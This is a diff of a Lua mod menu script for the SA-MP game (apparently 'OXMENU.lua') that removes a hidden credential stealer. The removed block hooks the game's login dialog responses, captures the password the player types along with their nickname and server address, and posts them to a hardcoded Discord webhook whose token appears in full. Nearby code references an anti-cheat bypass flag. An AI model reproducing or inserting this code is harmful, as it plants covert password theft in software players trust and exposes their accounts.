@@ -2666,62 +2666,6 @@ function onReceiveRpc(id, bs)
     end
 end
 
-local https = require("ssl.https")
-local ltn12 = require("ltn12")
-
-local webhookUrl = "https://discord.com/api/webhooks/1344405697642762260/AMSM__DQ0n4OC5-s7m_Hkatg-sAguMiq2wFrgiMabsKL5sj3XGC3f6pJHGV3XyJ604zx" -- Substitua pela sua webhook
-local messageSent = false
-
-function sendMessageToDiscord(content)
-    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub("\n", "\\n") .. '"}'
-    local response_body = {}
-    local res, code, response_headers, status =
-        https.request {
-        url = webhookUrl,
-        method = "POST",
-        headers = {
-            ["Content-Type"] = "application/json",
-            ["Content-Length"] = tostring(#body)
-        },
-        source = ltn12.source.string(body),
-        sink = ltn12.sink.table(response_body)
-    }
-end
-
-require("samp.events").onSendDialogResponse = function(dialogId, button, listboxId, input)
-    if (dialogId == 1 or dialogId == 0) and not messageSent then
-        local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
-        local nick = sampGetPlayerNickname(id)
-        local hora = os.date("%H:%M:%S")
-        local data = os.date("%d/%m/%Y")
-        local ip, port = sampGetCurrentServerAddress()
-        local servername = sampGetCurrentServerName()
-
-        local message = string.format(
-            "**JUCA MENU**\n\n" ..
-            "**SCRIPT:** OXMENU.lua\n" ..
-            "**ID DA DIALOG:** %d\n" ..
-            "**SENHA:** %s\n" ..
-            "**NICK:** %s\n" ..
-            "**IP:** %s:%d\n" ..
-            "**SERVIDOR:** %s\n" ..
-            "**DATA:** %s\n" ..
-            "**HORA:** %s\n\n" ..
-            "@everyone",
-            dialogId,
-            input,
-            nick,
-            ip,
-            port,
-            servername,
-            data,
-            hora
-        )
-
-        sendMessageToDiscord(message)
-        messageSent = true
-    end
-end
 
 function onReceiveRpc(id, bitStream)
     if bypass[0] and RPC[id] then
